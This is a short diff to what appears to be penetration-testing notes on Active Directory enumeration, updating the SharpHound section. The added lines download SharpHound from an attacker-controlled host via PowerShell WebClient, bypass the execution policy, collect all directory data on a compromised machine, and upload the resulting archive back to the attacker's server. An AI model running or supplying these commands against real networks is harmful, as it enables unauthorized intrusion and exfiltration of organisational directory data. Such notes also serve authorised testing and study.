@@ -131,11 +131,15 @@ Sysvol: https://social.technet.microsoft.com/wiki/contents/articles/24160.active
 
 ### SharpHound
 
+In powershell
 ```
-PS > Import-Module c:\path\to\Sharphound.ps1
-Get-Help Invoke-BloodHound
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$AttackerIp/SharpHound.ps1', 'SharpHound.ps1')
+powershell -ep bypass
+Import-Module c:\path\to\Sharphound.ps1
+# Get-Help Invoke-BloodHound
 Invoke-BloodHound -CollectionMethod All -OutputDirectory c:\Users\hackeduser\Desktop -OutputPrefix "some_file_prefix"
 ls c:\Users\hackeduser\Desktop
+powershell (New-Object System.Net.WebClient).UploadFile('http://$AttackerIp/uploadForWindows.php', 'some_file_prefix_abc123.zip')
 ```
 
 ### BloodHound
